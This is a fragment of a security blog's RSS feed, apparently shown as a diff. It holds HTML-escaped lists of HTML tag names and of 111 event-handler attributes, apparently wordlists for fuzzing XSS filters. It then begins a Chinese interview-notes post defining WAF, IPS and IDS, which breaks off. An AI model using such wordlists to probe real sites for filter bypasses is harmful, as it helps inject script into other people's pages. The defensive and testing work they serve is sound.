class=&#34;line&#34;&gt;embed&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fieldset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;figcaption&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;figure&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;font&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;footer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;form&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;frame&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;frameset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;h1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;head&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;header&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hgroup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;html&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iframe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iframe2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;image&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;image2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;image3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;img&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;img2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;input&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;input2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;input3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;input4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kbd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keygen&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;label&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;legend&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;li&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;link&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;listing&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;map&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mark&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;marquee&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;menu&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;menuitem&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;meta&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;meter&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;multicol&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nav&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nextid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nobr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;noembed&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;noframes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;noscript&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;object&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ol&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;optgroup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;option&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;output&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;param&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;picture&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;plaintext&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pre&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;progress&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;q&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rtc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ruby&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;samp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;script&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;section&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shadow&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;slot&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;small&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;source&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;spacer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;span&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;strike&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;strong&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;style&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sub&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;summary&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;svg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;table&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tbody&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;td&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;template&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;textarea&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tfoot&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;th&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;thead&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;title&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;track&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;u&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ul&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;video&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;video2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wbr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;xmp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;2.events&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onafterprint&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onafterscriptexecute&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onanimationcancel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onanimationend&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onanimationiteration&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onanimationstart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onauxclick&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onbeforecopy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onbeforecut&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onbeforeinput&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onbeforeprint&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onbeforescriptexecute&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onbeforeunload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onbegin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onblur&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onbounce&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;oncanplay&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;oncanplaythrough&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onchange&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onclick&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onclose&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;oncontextmenu&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;oncopy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;oncuechange&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;oncut&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ondblclick&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ondrag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ondragend&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ondragenter&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ondragleave&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ondragover&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ondragstart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ondrop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ondurationchange&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onend&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onended&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onerror&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onfinish&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onfocus&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onfocusin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onfocusout&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onfullscreenchange&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onhashchange&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;oninput&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;oninvalid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onkeydown&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onkeypress&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onkeyup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onloadeddata&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onloadedmetadata&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onloadend&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onloadstart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmessage&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmousedown&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmouseenter&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmouseleave&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmousemove&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmouseout&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmouseover&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmouseup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmousewheel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmozfullscreenchange&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpagehide&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpageshow&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpaste&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpause&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onplay&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onplaying&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpointerdown&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpointerenter&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpointerleave&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpointermove&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpointerout&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpointerover&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpointerrawupdate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpointerup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpopstate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onprogress&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onratechange&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onrepeat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onreset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onresize&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onscroll&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onsearch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onseeked&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onseeking&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onselect&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onselectionchange&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onselectstart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onshow&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onstart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onsubmit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ontimeupdate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ontoggle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ontouchend&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ontouchmove&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ontouchstart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ontransitioncancel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ontransitionend&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ontransitionrun&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ontransitionstart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onunhandledrejection&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onunload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onvolumechange&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onwebkitanimationend&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onwebkitanimationiteration&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onwebkitanimationstart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onwebkittransitionend&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onwheel&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://ericcd.com/2022/11/30/hvv/</guid>
+            <title>面经</title>
+            <link>http://ericcd.com/2022/11/30/hvv/</link>
+            <category term="web" scheme="http://ericcd.com/categories/web/" />
+            <category term="web" scheme="http://ericcd.com/tags/web/" />
+            <pubDate>Wed, 30 Nov 2022 14:26:13 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;面经总结&lt;br /&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h1 id=&#34;个人知识扫盲&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#个人知识扫盲&#34;&gt;#&lt;/a&gt; 个人知识扫盲&lt;/h1&gt;
+&lt;p&gt;1.waf&lt;br /&gt;
+Web 应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web 应用防火墙是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。&lt;/p&gt;
+&lt;p&gt;2.ips&lt;br /&gt;
+ 入侵防御系统 (IPS: Intrusion Prevention System) 是电脑网络安全设施，是对防病毒软件（Antivirus Programs）和防火墙 (Packet Filter, Application Gateway) 的补充。 入侵防御系统 (Intrusion-prevention system) 是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够及时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为，能够帮助组织识别恶意流量，并主动阻止此类流量进入其网络。。&lt;br /&gt;
+IPS 一般也是在网络层旁路，可以理解为具备阻断能力的 IDS，是 IDS 的升级版（也有 IDS 检测到攻击通知阻断设备执行阻断动作的设备联动模式），可以覆盖网络层和应用层。&lt;/p&gt;
+&lt;p&gt;3.ids&lt;br /&gt;
+IDS（intrusion detection system）入侵检测系统是一种对网络传输进行即时监视，在发现可疑传输时发出警报或者采取主动反应措施的网络安全设备。它与其他网络安全设备的不同之处便在于，IDS 是一种积极主动的安全防护技术。&lt;br /&gt;
